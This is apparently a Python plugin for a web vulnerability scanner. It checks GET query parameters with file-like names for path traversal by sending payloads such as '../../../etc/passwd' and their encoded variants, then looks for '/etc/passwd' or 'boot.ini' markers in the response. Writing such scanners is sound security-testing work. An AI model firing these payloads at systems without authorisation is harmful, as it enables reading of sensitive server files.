from __future__ import annotations

from typing import ClassVar

from juicechain.core.http_client import HttpClient
from juicechain.core.input_point import InputPoint, Location
from juicechain.core.target import join_url
from juicechain.plugins.base import Finding, VulnPlugin
from juicechain.utils.logging import get_logger

logger = get_logger(__name__)

_PAYLOADS: tuple[str, ...] = (
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
)
_FILE_LIKE_PARAMS = {
    "file",
    "path",
    "dir",
    "folder",
    "download",
    "filename",
    "load",
    "read",
    "include",
    "page",
    "template",
    "doc",
    "f",
}


class Plugin(VulnPlugin):
    name: ClassVar[str] = "PATH_TRAVERSAL"
    severity: ClassVar[str] = "high"
    supported_locations: ClassVar[set[Location]] = {"query"}

    def check(
        self,
        base: str,
        point: InputPoint,
        client: HttpClient,
        timeout: float,
        max_bytes: int,
    ) -> Finding | None:
        if point.method != "GET":
            return None
        if point.location != "query":
            return None

        param_l = (point.param or "").strip().lower()
        if param_l not in _FILE_LIKE_PARAMS:
            return None

        url = join_url(base, point.path)
        for payload in _PAYLOADS:
            res = client.request(
                "GET",
                url,
                timeout=timeout,
                max_bytes=max_bytes,
                params={point.param: payload},
                headers=point.extra_headers,
            )
            if not res.ok:
                continue

            body = res.text()
            body_l = body.lower()
            hit = ""
            if "root:x:0:0" in body_l:
                hit = "root:x:0:0"
            elif "[boot loader]" in body_l:
                hit = "[boot loader]"
            if not hit:
                continue

            logger.info("potential path traversal finding: path=%s param=%s", point.path, point.param)
            return Finding(
                vuln_type=self.name,
                severity=self.severity,
                evidence=f"file disclosure indicator found in response body: {hit}",
                request={
                    "method": "GET",
                    "url": url,
                    "location": point.location,
                    "param": point.param,
                    "payload": payload,
                },
                response={
                    "status_code": res.status_code,
                    "content_type": res.content_type(),
                    "time_ms": res.response_time_ms,
                },
            )

        return None
